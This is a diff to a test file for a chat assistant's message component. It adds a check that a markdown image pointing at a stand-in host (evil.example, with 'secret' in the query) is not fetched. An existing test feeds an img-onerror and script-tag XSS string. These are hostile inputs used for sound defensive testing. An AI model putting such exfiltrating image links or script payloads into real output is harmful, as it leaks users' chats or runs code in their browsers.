@@ -112,6 +112,14 @@ describe('AssistantMessage', () => {
     expect(screen.getByText('1.2k in · 340 out · $0.0012')).toBeTruthy()
   })
 
+  it('markdown images are not loaded (no remote requests that could leak the chat)', () => {
+    const { container } = render(
+      <AssistantMessage event={e.assistant('Look ![chart](https://evil.example/x.png?q=secret)')} onRetry={() => {}} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.textContent).toContain('chart')
+  })
+
   it('raw HTML in model text is not rendered as elements', () => {
     const { container } = render(
       <AssistantMessage event={e.assistant('<img src=x onerror="alert(1)"> <script>bad()</script> hi')} onRetry={() => {}} />,
